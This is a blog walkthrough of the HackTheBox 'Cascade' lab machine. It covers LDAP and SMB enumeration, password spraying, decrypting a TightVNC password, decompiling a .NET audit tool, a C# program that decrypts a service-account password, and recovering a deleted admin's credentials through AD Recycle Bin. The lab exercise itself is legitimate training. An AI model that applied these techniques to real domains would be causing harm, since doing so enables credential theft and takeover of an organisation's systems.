---
layout: post
os: windows
machine_name: cascade
title: Cascade machine writeup
subtitle: From domain reconnaissance to reverse engineering. Come and have fun.
categories: HTB
cover-img: /assets/img/cascade/recycle_bin.png
thumbnail-img: /assets/img/cascade/cascade_logo.png
tags: [HTB, Active Directory, Powershell, LDAP, Reversing]
comments: true
---
In this article I'm going to explain how I solve Cascade HTB machine. I choose to write on Cascade machine because of the broad knowledge required to solve this machine.

# Recon

## nmap

```bash
└─$ nmap -p- -sV -sC 10.10.10.182 -A -oA allscripts
```

![image-20220712092435863](/home/nave/navnav221.github.io/assets/img/cascade/cascade-nmap.png)

First of all, a good thumb role: When you see a bunch of services like DNS, Kerberos, SMB, etc... The machine you face with is probably the DC.

From now on you can start gather information from one of the following: SMB, RPC, LDAP, DNS (In the article I'll show the reconnaissance process only on services that was useful for the challenge solving. But make no mistake, I make recon on other services as well!).

## RPC | TCP 139

For the RPC section I used a tool called: **"enum4linux"**. This tool is great for information gathering from services such as: Samba, RPC and NetBIOS.

```bash
enum4linux -U 10.10.10.182 > users.txt
```

![image-20220713044342957](/home/nave/navnav221.github.io/assets/img/cascade/cascade_enum4linux_user_result.png)

As we can see we get a list of domain's users, this list can be very useful in further steps. Let's format the file so we'd have all the cleaned usernames list:

```bash
└─$ cat users.txt | grep -e '^user' | cut -d ':' -f2 | cut -d ' ' -f1 | tr -d '[]' > clear_users_list.txt
```

![image-20220713070451246](/home/nave/navnav221.github.io/assets/img/cascade/cascade_clear_user_list.png)

## LDAP | TCP 3268

```bash
└─$ ldapsearch -x -h 10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local"
```

From all results we collect from the 'ldapsearch' tool, there is one thing caught my eyes:

![image-20220712140143183](/home/nave/navnav221.github.io/assets/img/cascade/cascade-ldapsearch_01.png)

It seems to be a base64 encoded password. Let's decode it and see if it'll help us later:

```bash
└─$ echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

## SMB | Port 445

With all usernames above, we'll need to brute-force a little bit to check the user's credentials. I done that with **crackmapexec** tool, you can do that with other tools such as hydra :

![image-20220712141043877](/home/nave/navnav221.github.io/assets/img/cascade/cascade_smb_cme.png)

As you can see we have a valid credentials - *r.thompson:rY4n5eva*. After we have *thompson* creds let's use them to login to the only share that is not the default -*Data* SMB share (For explanation about each share click [here](https://docs.netapp.com/us-en/ontap/smb-admin/default-administrative-shares-concept.html)):

## TightVNC

```bash
└─$ smbclient -U 'cascade.local/r.thompson' //10.10.10.182/Data -c 'recurse ON;ls'
```

(`recurse ON;ls` list all the network share files recursively)

![image-20220713072442724](/home/nave/navnav221.github.io/assets/img/cascade/cascade_vnc_install_registry.png)

After I analyzed most of the network share files, I found a *VNC Install* registry file. *VNC* is a graphical desktop-sharing system which transmits the keyboard and mouse input from one PC to another and eventually offer a remote control service.

```bash
└─$ get 'VNC Install.reg'
```

In the registry file we can find a password, this password used to authenticate a user before using the VNC program:

![image-20220713080942376](/home/nave/navnav221.github.io/assets/img/cascade/cascade_vnc_password.png)

We can also find the used VNC program - TightVNC:

![image-20220713075524845](/home/nave/navnav221.github.io/assets/img/cascade/cascade_VNC_program.png)

It's useful because there is a default encryption key within several VNC products and *TightVNC* is one of them. This could help us to decrypt the password we saw: https://github.com/billchaison/VNCDecrypt

Crack VNC passwords:

![image-20220712142236323`](/home/nave/navnav221.github.io/assets/img/cascade/cascade_decrypt_password.png)

After we got another password, let's use **crackmapexec** to find access to other smb shares:

![image-20220713082227109](/home/nave/navnav221.github.io/assets/img/cascade/cascade_cme_with_vnc_password.png)

# Foothold

## s.smith foothold

After we got *s.smith* credentials I found out that we have a remote commend execution through **crackmapexec** with WinRM protocol. Let's use it for reverse shell:

- First - open a local SMB share to grab the reverse shell script on the target:
  ![image-20220713092758187](/home/nave/navnav221.github.io/assets/img/cascade/cascade_local_smb_share.png)
- Second - grab the reverse shell file on the target:
  ![image-20220713094107728](/home/nave/navnav221.github.io/assets/img/cascade/cascade_grab_reverse_shell_from_smb_share_as_smith.png)
- Third - Set a listener on the port you specified inside the script and execute the script on the target:
  ![image-20220713094341928](/home/nave/navnav221.github.io/assets/img/cascade/cascade_revere_shell_execution_as_smith.png)
- And finally:
  ![image-20220713094709004](/home/nave/navnav221.github.io/assets/img/cascade/cascade_smith_shell.png)

Because I am a nice person I'll leave to you the part of revel the flag :blush:

## arksvc foothold

Ok, we got a new share access with READ permission:

![image-20220713082453350](/home/nave/navnav221.github.io/assets/img/cascade/cascade_audit_share_files.png)

If we look inside the batch file *RunAudit.bat* we can infer that *CascAudit.exe* do some manipulation on *Audit.db* database and return answer:

```bash
└─$ cat RunAudit.bat    
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

To understand what *CascAudit.exe* do we need to grab it and analyze it:

```bash
smb: \> get CascAudit.exe    
smb: \DB\> get Audit.db
```

### Reversing

Before we start to reverse, we need to distinguish between these three things:

- **Debugger** - allows us to step through the program's assemble interactivly.
- **Disassembler** - View the program assembly in more detail.
- **Decompiler** - Gives us a partial program source code, assuming we know the language it was written in.

Now I ask you - with which method you want to start? Definitely **Decompiling**.

 So let's figure out which platform the executable file we found written in:

![image-20220713085514871](/home/nave/navnav221.github.io/assets/img/cascade/cascade_exe_source_platform.png)

The source code compiled in .NET environment and there is a very good decompiler tool for .NET environment called *[dnSpy](https://github.com/dnSpy/dnSpy)* that could help us.

```c#
	public static void Main()
	{
		if (MyProject.Application.CommandLineArgs.Count != 1)
		{
			Console.WriteLine("Invalid number of command line args specified. Must specify database path only");
			return;
		}
		checked
		{
			using (SQLiteConnection sqliteConnection = new SQLiteConnection("Data Source=" + MyProject.Application.CommandLineArgs[0] + ";Version=3;"))
			{
				string str = string.Empty;
				string password = string.Empty;
				string str2 = string.Empty;
				try
				{
					sqliteConnection.Open();
					using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", sqliteConnection))
					{
						using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
						{
							sqliteDataReader.Read();
							str = Conversions.ToString(sqliteDataReader["Uname"]);
							str2 = Conversions.ToString(sqliteDataReader["Domain"]);
							string encryptedString = Conversions.ToString(sqliteDataReader["Pwd"]);
							try
							{
								password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
							}
							catch (Exception ex)
							{
								Console.WriteLine("Error decrypting password: " + ex.Message);
								return;
							}
						}
					}
					sqliteConnection.Close();
				}
				catch (Exception ex2)
				{
					Console.WriteLine("Error getting LDAP connection data From database: " + ex2.Message);
					return;
				}
				int num = 0;
				using (DirectoryEntry directoryEntry = new DirectoryEntry())
				{
					directoryEntry.Username = str2 + "\\" + str;
					directoryEntry.Password = password;
					directoryEntry.AuthenticationType = AuthenticationTypes.Secure;
					using (DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry))
					{
						directorySearcher.Tombstone = true;
						directorySearcher.PageSize = 1000;
						directorySearcher.Filter = "(&(isDeleted=TRUE)(objectclass=user))";
						directorySearcher.PropertiesToLoad.AddRange(new string[]
						{
							"cn",
							"sAMAccountName",
							"distinguishedName"
						});
						using (SearchResultCollection searchResultCollection = directorySearcher.FindAll())
						{
							Console.WriteLine("Found " + Conversions.ToString(searchResultCollection.Count) + " results from LDAP query");
							sqliteConnection.Open();
							try
							{
								try
								{
									foreach (object obj in searchResultCollection)
									{
										SearchResult searchResult = (SearchResult)obj;
										string value = string.Empty;
										string value2 = string.Empty;
										string value3 = string.Empty;
										if (searchResult.Properties.Contains("cn"))
										{
											value = Conversions.ToString(searchResult.Properties["cn"][0]);
										}
										if (searchResult.Properties.Contains("sAMAccountName"))
										{
											value2 = Conversions.ToString(searchResult.Properties["sAMAccountName"][0]);
										}
										if (searchResult.Properties.Contains("distinguishedName"))
										{
											value3 = Conversions.ToString(searchResult.Properties["distinguishedName"][0]);
										}
										using (SQLiteCommand sqliteCommand2 = new SQLiteCommand("INSERT INTO DeletedUserAudit (Name,Username,DistinguishedName) VALUES (@Name,@Username,@Dn)", sqliteConnection))
										{
											sqliteCommand2.Parameters.AddWithValue("@Name", value);
											sqliteCommand2.Parameters.AddWithValue("@Username", value2);
											sqliteCommand2.Parameters.AddWithValue("@Dn", value3);
											num += sqliteCommand2.ExecuteNonQuery();
										}
									}
								}
								finally
								{
									IEnumerator enumerator;
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							finally
							{
								sqliteConnection.Close();
								Console.WriteLine("Successfully inserted " + Conversions.ToString(num) + " row(s) into database");
							}
						}
					}
				}
			}
		}
```

In briefly - the program querying with LDAP for deleted users. To querying with LDAP, the program supply elevated user credentials to the DC. These credentials invoked from *Audit.db* *LDAP* table that we already has (remember *RunAudit.bat* file):

![image-20220713091407450](/home/nave/.config/Typora/typora-user-images/image-20220713091407450.png) 

In stage (1) we can see the SQL query for the elevated user credentials. Stage (2) place the user password in encrypted format inside a variable. Stage (3) make the password decryption process with the encryption key: *c4scadek3y654321*.

Because I has access to the *DecryptString* function I create a little program that decrypt the elevated user's password from the DB:

```c#
	using System;
	using System.IO;
	using System.Security.Cryptography;
	using System.Text;
	using System.Data.SQLite;
	
	
	namespace CascDecrypting
	{
	    class Program
	    {
	        static void Main(string[] args)
	        {
				using (SQLiteConnection conn = new SQLiteConnection("Data Source=C:\\path\\to\\Audit.db;Version=3;"))
	            {
					try
	                {
						conn.Open();
						using (SQLiteCommand sqliteCommand = new SQLiteCommand("SELECT * FROM LDAP", conn))
	                    {
							using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())
	                        {
								while (sqliteDataReader.Read())
								{
									Console.WriteLine("Encrypted PWD: " + sqliteDataReader["Pwd"]);
									Console.WriteLine("PlainText PWD: " + DecryptString(sqliteDataReader["Pwd"].ToString(), "c4scadek3y654321"));
									Console.WriteLine("Uname: " + sqliteDataReader["Uname"]);
									Console.WriteLine("Domain: " + sqliteDataReader["Domain"]);
	
								}
	                        }
	                    }
						conn.Close();
	                }
					catch (Exception ex2)
	                {
	                    Console.WriteLine("Can't reterive data from the DB!");
	                    Console.WriteLine("[ERROR]" + ex2.Message);
						return;
	                }
	            }
	        }
	
			public static string DecryptString(string EncryptedString, string Key)
			{
				byte[] array = Convert.FromBase64String(EncryptedString);
				Aes aes = Aes.Create();
				aes.KeySize = 128;
				aes.BlockSize = 128;
				aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
				aes.Mode = CipherMode.CBC;
				aes.Key = Encoding.UTF8.GetBytes(Key);
				string @string;
				using (MemoryStream memoryStream = new MemoryStream(array))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
					{
						byte[] array2 = new byte[checked(array.Length - 1 + 1)];
						cryptoStream.Read(array2, 0, array2.Length);
						@string = Encoding.UTF8.GetString(array2);
					}
				}
				return @string;
			}
		}
}
```

```bash
====================OUTPUT====================
Encrypted PWD: BQO5l5Kj9MdErXx6Q6AGOw==
PlainText PWD: w3lc0meFr31nd
Uname: ArkSvc
Domain: cascade.local
```

BOOM:bomb:

To get a reverse shell I used a remote commend execution through **crackmapexec** with WinRM protocol.

First, I opened a local smb share to transfer the powershell reverse shell script:

![image-20220713092758187](/home/nave/navnav221.github.io/assets/img/cascade/cascade_local_smb_share.png)

Second, I grab it on the target machine:

![image-20220713092903582](/home/nave/navnav221.github.io/assets/img/cascade/cascade_grab_reverse_shell_from_smb_share.png)

Set a listener in the background on the port I set inside the script (443 in my case) and then execute the powershell script on the target:

![image-20220713093159287](/home/nave/navnav221.github.io/assets/img/cascade/cascade_revere_shell_execution.png)

![image-20220713093245793](/home/nave/navnav221.github.io/assets/img/cascade/cascade_reverse_shell_success.png)

It's great but we don't have permissions to the *administrator* user folder to grab to *root.txt* file :disappointed: ...

## administrator foothold

When I checked *arksvc*'s groups, I noticed that is member of *AD Recycle Bin* domain group:

![image-20220713100257645](/home/nave/navnav221.github.io/assets/img/cascade/cascade_arksvc_groups.png)

You might ask "why you choose to pay attention to this specific group?". Well, Remember *CascAudit.exe*? For what reason we use *arksvc* account credentials? To retrieve deleted users through LDAP. 

Inside *DeletedUserAudit* *Audit.db* table you could find *TempAdmin* user. which tells us that he was one of the deleted users that retrieved from the *CascAudit.exe* run:

![image-20220713101245882](/home/nave/navnav221.github.io/assets/img/cascade/cascade_audit_db_deleted_users.png)

Why this user important to us :thinking:

One of the files from the *Data* smb share was: *Metting_Notes_June_2018.html*

![image-20220713101652937](/home/nave/navnav221.github.io/assets/img/cascade/cascade_data_smb_share_meeting_note_file.png)

***TempAdmin* password is the same as admin account password! Great!**

Now let's use *arksvc* superpower to grab the deleted *TempAdmin* account:

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

![image-20220713102120994](/home/nave/navnav221.github.io/assets/img/cascade/cascade_temp_admin_recycled_creds.png)

Cool! We got *TempAdmin* base64 password, now let's decode it:

![image-20220713102239455](/home/nave/navnav221.github.io/assets/img/cascade/cascade_decode_base64_temp_admin_pwd.png)

Now as before we start the reverse shell process with WinRM:

![image-20220713102435676](/home/nave/navnav221.github.io/assets/img/cascade/cascade_administrator_Reverse_shell.png)

The end :cat:
